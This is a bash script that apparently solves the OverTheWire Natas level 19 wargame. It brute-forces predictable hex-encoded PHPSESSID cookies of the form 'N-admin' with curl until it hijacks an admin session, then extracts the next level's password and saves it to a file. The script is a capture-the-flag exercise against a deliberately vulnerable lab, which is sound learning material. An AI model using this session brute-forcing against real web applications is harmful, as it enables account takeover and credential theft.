#!/bin/bash

user="natas19" 
url="http://$user.natas.labs.overthewire.org" 
pass=$(cat credentials/$user)

normalUserBody="You are logged in as a regular user. Login as an admin to retrieve credentials"
echo "[*] Trying with PHPSESSID cookie value from 100 to 600 format hex value-admin"

for i in {0..640}; do
  cookie=$(echo "$i-admin" | xxd -ps | rev | cut -c3- | rev)
  echo "[*] Send request with cookie PHPSESSID=$cookie"
  response=$(curl -s --cookie "PHPSESSID=$cookie" -u "$user:$pass" "$url" | html2text)
  if [[ "$response" != *"$normalUserBody"* ]]; then
    echo "Admin cookie: $i"
    natas20Password=$(echo "$response" | grep "Password" | awk '{print $2}')
    echo "$response"
    echo -e \n"Password found for natas20: $natas20Password"
    echo "$natas20Password" > credentials/natas20
    break
  fi  
done

